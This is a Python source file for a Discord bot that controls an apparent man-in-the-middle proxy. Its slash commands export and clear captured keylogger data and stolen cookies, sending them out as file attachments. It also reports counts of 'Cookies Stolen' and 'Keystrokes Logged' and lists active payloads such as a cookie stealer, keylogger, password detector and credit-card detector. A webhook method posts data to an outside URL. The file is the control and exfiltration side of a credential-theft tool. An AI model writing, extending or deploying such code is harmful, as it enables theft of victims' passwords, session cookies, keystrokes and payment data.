import discord
from discord import app_commands
from discord.ext import commands
import json
import os
import threading
from datetime import datetime
from colorama import Fore
import sys
import asyncio

class ProxyBot(commands.Bot):
    def __init__(self, webhook_url):
        intents = discord.Intents.all()
        super().__init__(command_prefix='/', intents=intents)
        self.webhook_url = webhook_url
        self.proxy_running = True
        
    async def setup_hook(self):
        print(f"{Fore.YELLOW}[*] Syncing commands...{Fore.RESET}")
        await self.tree.sync()
        print(f"{Fore.GREEN}[+] Commands synced successfully{Fore.RESET}")

class DiscordBot:
    def __init__(self, webhook_url, token):
        print(f"{Fore.YELLOW}[*] Initializing Discord bot...{Fore.RESET}")
        self.webhook_url = webhook_url
        self.token = token
        self.bot = ProxyBot(webhook_url)
        self.setup_commands()
        self.start()

    def setup_commands(self):
        @self.bot.event
        async def on_ready():
            print(f"{Fore.GREEN}[+] Bot is ready as {self.bot.user.name}#{self.bot.user.discriminator}{Fore.RESET}")
            try:
                synced = await self.bot.tree.sync()
                print(f"{Fore.GREEN}[+] Synced {len(synced)} command(s){Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}[!] Failed to sync commands: {e}{Fore.RESET}")

        @self.bot.tree.command(name="help", description="Display all available commands")
        @app_commands.default_permissions()
        async def help(interaction: discord.Interaction):
            embed = discord.Embed(
                title="🔧 MITM Proxy Commands",
                description="Available commands for the proxy bot",
                color=0xc50f1f
            )
            
            commands = {
                "🔍 Information": {
                    "/help": "Show this help message",
                    "/status": "Check proxy status",
                    "/payloads": "View active/inactive payloads"
                },
                "📤 Data Export": {
                    "/exportkl": "Export and clear keylogger data",
                    "/exportck": "Export and clear cookies",
                    "/exportall": "Export all captured data"
                },
                "⚙️ Control": {
                    "/stop": "Stop the proxy server",
                    "/clear": "Clear all stored data",
                    "/toggle": "Toggle specific payloads"
                }
            }
            
            for category, cmds in commands.items():
                embed.add_field(
                    name=category,
                    value="\n".join([f"`{cmd}` - {desc}" for cmd, desc in cmds.items()]),
                    inline=False
                )
            
            await interaction.response.send_message(embed=embed)

        @self.bot.tree.command(name="exportkl", description="Export and clear keylogger data")
        async def exportkl(interaction: discord.Interaction):
            try:
                with open('keylogs.json', 'r') as f:
                    data = json.load(f)
                
                if not data:
                    await interaction.response.send_message("❌ No keylogger data available!")
                    return

                # Create temp file for export
                with open('temp_keylog.json', 'w') as f:
                    json.dump(data, f, indent=2)
                
                # Send file and stats
                embed = discord.Embed(
                    title="📤 Keylogger Export",
                    description=f"Exported {len(data)} entries",
                    color=0x00ff00
                )
                
                await interaction.response.send_message(
                    embed=embed,
                    file=discord.File('temp_keylog.json')
                )
                
                # Clear data after successful export
                with open('keylogs.json', 'w') as f:
                    json.dump([], f)
                
                # Cleanup
                os.remove('temp_keylog.json')
                
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {str(e)}")

        @self.bot.tree.command(name="exportck", description="Export and clear cookies")
        async def exportck(interaction: discord.Interaction):
            try:
                with open('cookies.json', 'r') as f:
                    data = json.load(f)
                
                if not data:
                    await interaction.response.send_message("❌ No cookie data available!")
                    return

                # Create temp file for export
                with open('temp_cookies.json', 'w') as f:
                    json.dump(data, f, indent=2)
                
                embed = discord.Embed(
                    title="📤 Cookie Export",
                    description=f"Exported {len(data)} cookies",
                    color=0x00ff00
                )
                
                await interaction.response.send_message(
                    embed=embed,
                    file=discord.File('temp_cookies.json')
                )
                
                # Clear data after successful export
                with open('cookies.json', 'w') as f:
                    json.dump([], f)
                
                # Cleanup
                os.remove('temp_cookies.json')
                
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {str(e)}")

        @self.bot.tree.command(name="stop", description="Stop the proxy server")
        async def stop(interaction: discord.Interaction):
            embed = discord.Embed(
                title="🛑 Stopping Proxy",
                description="The proxy server is shutting down...",
                color=0xff0000
            )
            await interaction.response.send_message(embed=embed)
            # Graceful shutdown
            self.running = False
            sys.exit(0)

        @self.bot.tree.command(name="payloads", description="View active and inactive payloads")
        async def payloads(interaction: discord.Interaction):
            payloads = {
                "Cookie Stealer": True,
                "Keylogger": True,
                "Password Detector": True,
                "Credit Card Detector": True,
                "Email Detector": True,
                "Geolocation": True
            }
            
            embed = discord.Embed(
                title="🔌 Payload Status",
                description="Current status of all payloads",
                color=0x00ff00
            )
            
            for name, status in payloads.items():
                embed.add_field(
                    name=name,
                    value=f"{'🟢 Active' if status else '🔴 Inactive'}",
                    inline=True
                )
            
            await interaction.response.send_message(embed=embed)

        @self.bot.tree.command(name="status", description="Check proxy status")
        async def status(interaction: discord.Interaction):
            try:
                with open('requests.json', 'r') as f:
                    requests_data = json.load(f)
                with open('cookies.json', 'r') as f:
                    cookies_data = json.load(f)
                with open('keylogs.json', 'r') as f:
                    keylog_data = json.load(f)
                
                embed = discord.Embed(
                    title="📊 Proxy Status",
                    description="Current proxy statistics",
                    color=0x00ff00
                )
                
                embed.add_field(name="Status", value="🟢 Running", inline=True)
                embed.add_field(name="Requests Captured", value=str(len(requests_data)), inline=True)
                embed.add_field(name="Cookies Stolen", value=str(len(cookies_data)), inline=True)
                embed.add_field(name="Keystrokes Logged", value=str(len(keylog_data)), inline=True)
                
                await interaction.response.send_message(embed=embed)
                
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {str(e)}")

        @self.bot.tree.command(name="clear", description="Clear all stored data")
        async def clear(interaction: discord.Interaction):
            try:
                # Clear all JSON files
                for file in ['cookies.json', 'keylogs.json', 'requests.json']:
                    with open(file, 'w') as f:
                        json.dump([], f)
                
                embed = discord.Embed(
                    title="🧹 Data Cleared",
                    description="All stored data has been cleared",
                    color=0x00ff00
                )
                await interaction.response.send_message(embed=embed)
                
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {str(e)}")

    def start(self):
        try:
            print(f"{Fore.YELLOW}[*] Starting Discord bot...{Fore.RESET}")
            self.bot.run(self.token, log_handler=None)
        except discord.LoginFailure:
            print(f"{Fore.RED}[!] Failed to login. Check your token.{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Bot error: {e}{Fore.RESET}")

    def stop(self):
        print(f"{Fore.YELLOW}[*] Stopping Discord bot...{Fore.RESET}")
        if self.bot:
            asyncio.run_coroutine_threadsafe(self.bot.close(), self.bot.loop)

    def send_webhook(self, data):
        try:
            response = requests.post(self.webhook_url, json=data)
            if response.status_code != 204:
                print(f"{Fore.RED}[!] Webhook error: {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to send webhook: {str(e)}{Fore.RESET}")
